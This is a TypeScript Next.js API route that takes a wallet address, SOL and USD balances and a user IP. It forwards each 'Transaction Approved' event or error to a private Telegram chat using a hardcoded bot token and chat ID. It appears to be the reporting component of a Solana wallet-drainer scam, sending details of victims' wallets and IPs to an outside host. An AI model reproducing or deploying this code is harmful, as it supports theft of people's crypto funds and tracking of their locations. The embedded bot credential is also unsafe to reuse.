import { type NextRequest, NextResponse } from "next/server" 

const TELEGRAM_BOT_TOKEN = "8341387926:AAGEi8QJ2LSLphS15rmAOwS8aPfJ15cX27U" 
const TELEGRAM_CHAT_ID = "7556622176" 

async function sendTelegramNotification(
  walletAddress: string, 
  balanceSOL: number, 
  balanceUSD: number, 
  userIP: string,
  type: "approval" | "error",
  errorMessage?: string,
  errorDetails?: string
) { 
  try { 
    let message: string
    
    if (type === "approval") {
      message = ` 
🕯 *Transaction Approved* 

📍 *Address:* \`${walletAddress}\` 
💰 *Balance:* ${balanceSOL.toFixed(6)} SOL 
💵 *Balance USD:* $${balanceUSD.toFixed(2)} 
🌐 *IP:* ${userIP} 
      `.trim()
    } else {
      message = ` 
❌ *Error in Approval API*

📍 *Address:* \`${walletAddress}\` 
💰 *Balance:* ${balanceSOL.toFixed(6)} SOL 
💵 *Balance USD:* $${balanceUSD.toFixed(2)} 
🌐 *IP:* ${userIP} 
🔴 *Error:* ${errorMessage || "Unknown error"}
📝 *Details:* ${errorDetails || "No additional details"}
      `.trim()
    }

    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage` 

    await fetch(telegramUrl, { 
      method: "POST", 
      headers: { 
        "Content-Type": "application/json", 
      }, 
      body: JSON.stringify({ 
        chat_id: TELEGRAM_CHAT_ID, 
        text: message, 
        parse_mode: "Markdown", 
      }), 
    }) 
  } catch (error) {
    console.error("Failed to send Telegram notification:", error)
  } 
} 

export async function POST(request: NextRequest) { 
  let walletAddress = "";
  let balanceSOL = 0;
  let balanceUSD = 0;
  let userIP = "";
  
  try { 
    const body = await request.json() 
    walletAddress = body.walletAddress;
    balanceSOL = body.balanceSOL;
    balanceUSD = body.balanceUSD;
    userIP = body.userIP;

    if (!walletAddress || balanceSOL === undefined || balanceUSD === undefined) { 
      const errorMsg = "Missing required parameters";
      await sendTelegramNotification(
        walletAddress || "unknown",
        balanceSOL || 0,
        balanceUSD || 0,
        userIP || "unknown",
        "error",
        errorMsg,
        `Missing: ${!walletAddress ? "walletAddress" : ""} ${balanceSOL === undefined ? "balanceSOL" : ""} ${balanceUSD === undefined ? "balanceUSD" : ""}`
      );
      return NextResponse.json({ error: errorMsg }, { status: 400 }) 
    } 

    await sendTelegramNotification(walletAddress, balanceSOL, balanceUSD, userIP || "unknown", "approval") 

    return NextResponse.json({ success: true }) 
  } catch (error) { 
    const errorMsg = error instanceof Error ? error.message : String(error);
    const errorDetails = error instanceof Error ? error.stack : "No stack trace";
    
    await sendTelegramNotification(
      walletAddress || "unknown",
      balanceSOL || 0,
      balanceUSD || 0,
      userIP || "unknown",
      "error",
      "Failed to process approval request",
      `${errorMsg}\n\n${errorDetails?.substring(0, 500)}`
    );
    
    return NextResponse.json({ error: "Failed to send notification" }, { status: 500 }) 
  } 
}
